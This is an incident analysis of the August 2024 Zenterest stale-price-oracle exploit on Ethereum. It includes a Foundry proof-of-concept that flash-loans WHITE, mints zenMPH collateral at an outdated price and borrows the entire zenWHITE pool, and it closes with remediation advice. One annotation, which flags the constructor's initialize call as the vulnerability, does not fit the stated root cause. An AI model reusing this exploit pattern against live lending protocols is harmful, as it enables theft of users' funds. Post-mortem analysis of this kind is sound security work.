# Zenterest — Over-Borrowing via Stale Price Oracle Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-30 |
| **Protocol** | Zenterest (Zenith Finance) |
| **Chain** | Ethereum |
| **Loss** | ~21,000 USD |
| **Attacker** | Address unidentified |
| **Attack Tx** | [0xfe8bc757d87e97a5471378c90d390df47e1b29bb9fca918b94acd8ecfaadc598](https://etherscan.io/tx/0xfe8bc757d87e97a5471378c90d390df47e1b29bb9fca918b94acd8ecfaadc598) |
| **Vulnerable Contract** | [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687](https://etherscan.io/address/0x4dD6D5D861EDcD361455b330fa28c4C9817dA687) (zenMPH) |
| **Root Cause** | Price oracle returning an outdated price, causing MPH collateral value to be overestimated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/Zenterest_exp.sol) |

---

## 1. Vulnerability Overview

The Zenterest (formerly Zenith Finance) lending protocol offered a service that accepted MPH tokens as collateral to lend out WHITE tokens. The price oracle in the zenMPH contract failed to reflect the latest price and instead returned a stale value. The attacker borrowed 85 WHITE via a Uniswap V3 flash loan, deposited MPH as collateral valued at the outdated inflated price, and borrowed the entire WHITE balance of the zenWHITE pool.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: oracle returning a stale price
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    // ❌ Cached price is not updated, returning a higher MPH price than actual
    return cachedPrices[cToken];  // stale value
}

// Attack flow: stale high MPH price → inflated collateral value → excess WHITE borrowed
function mint(uint256 mintAmount) external {
    // Collateral value calculated using stale price on MPH deposit
    uint256 collateralValue = mintAmount * oracle.getUnderlyingPrice(address(this));
    // → Collateral value assessed higher than actual
}

// ✅ Correct code: use up-to-date price via Chainlink
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    (, int256 price, , uint256 updatedAt,) = AggregatorV3Interface(feed).latestRoundData();
    require(block.timestamp - updatedAt <= MAX_STALENESS, "Price too stale");  // ✅ freshness check
    return uint256(price);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: CErc20Immutable.sol
contract CErc20Immutable is CErc20 {
    /**
     * @notice Construct a new money market
     * @param underlying_ The address of the underlying asset
     * @param comptroller_ The address of the Comptroller
     * @param interestRateModel_ The address of the interest rate model
     * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18
     * @param name_ ERC-20 name of this token
     * @param symbol_ ERC-20 symbol of this token
     * @param decimals_ ERC-20 decimal precision of this token
     * @param admin_ Address of the administrator of this token
     */
    constructor(address underlying_,
                ComptrollerInterface comptroller_,
                InterestRateModel interestRateModel_,
                uint initialExchangeRateMantissa_,
                string memory name_,
                string memory symbol_,
                uint8 decimals_,
                address payable admin_) public {
        // Creator of the contract is admin during initialization
        admin = msg.sender;

        // Initialize the market
        initialize(underlying_, comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);  // ❌ vulnerability

        // Set the proper admin now that initialization is done
        admin = admin_;
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Uniswap V3 Pool flash loan: borrow 85 WHITE
  │
  ├─[2]─► Receive 23,200 MPH transferred from privileged address (0x90744C)
  │
  ├─[3]─► Call zenMPH.enterMarkets([zenMPH])
  │
  ├─[4]─► Transfer 2,000 MPH directly to zenMPH (direct collateral injection)
  │         └─► zenMPH.mint(21,200 MPH) — collateral value overestimated using stale high price
  │
  ├─[5]─► Call zenWHITE.accrueInterest()
  │
  ├─[6]─► zenWHITE.borrow(entire WHITE balance of zenWHITE)
  │         └─► Full balance borrowed successfully thanks to stale MPH price
  │
  ├─[7]─► Repay WHITE balance to flash loan pool
  │
  └─[8]─► Total loss: ~21,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    Uni_Pair_V3 Pool = Uni_Pair_V3(0xC5c134A1f112efA96003f8559Dba6fAC0BA77692);
    IERC20 WHITE = IERC20(0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44);
    IERC20 MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);
    ICErc20Delegate zenMPH = ICErc20Delegate(0x4dD6D5D861EDcD361455b330fa28c4C9817dA687);
    ICErc20Delegate zenWHITE = ICErc20Delegate(0xE3334e66634acF17B2b97ab560ec92D6861b25fa);

    function testExploit() external {
        // Transfer MPH from privileged address (simulation)
        vm.prank(0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15);
        MPH.transfer(address(this), 23_200 ether);

        // [1] Flash loan 85 WHITE
        Pool.flash(address(this), 85 ether, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // [3] Register zenMPH as collateral market
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(zenMPH);
        IUnitroller(0x606246e9EF6C70DCb6CEE42136cd06D127E2B7C7).enterMarkets(cTokens);

        // [4] Deposit MPH (over-inflated collateral value due to stale price)
        MPH.approve(address(zenMPH), type(uint256).max);
        MPH.transfer(address(zenMPH), 2000 ether);
        zenMPH.mint(21_200 ether);

        // [6] Borrow entire zenWHITE balance
        uint256 borrowAmount = WHITE.balanceOf(address(zenWHITE));
        zenWHITE.borrow(borrowAmount);

        // [7] Repay flash loan
        WHITE.transfer(address(Pool), 85 ether + fee0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Stale Price Oracle |
| **Attack Technique** | Stale Oracle Borrow (flash loan serves as auxiliary funding) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Oracle Freshness Check**: Verify that the `updatedAt` timestamp from `latestRoundData()` is within an acceptable window of the current time (e.g., within 1 hour).
2. **Use Chainlink Live Feed**: Call Chainlink's `latestRoundData()` directly instead of relying on cached prices.
3. **Price Range Validation**: Halt transactions if the oracle price falls outside a reasonable range.
4. **Recalculate Collateral Value**: Add a step to recalculate collateral value using the latest oracle before executing a borrow.

## 7. Lessons Learned

- **Risk of Stale Oracles**: If a price feed does not reflect the latest market price, collateral value becomes overestimated, enabling over-borrowing.
- **Direct Transfer + Mint Pattern**: The pattern of directly transferring tokens to a contract before calling mint can also be exploited for collateral manipulation.
- **Oracle Update Frequency**: Oracles for low-liquidity tokens update infrequently, making them especially vulnerable.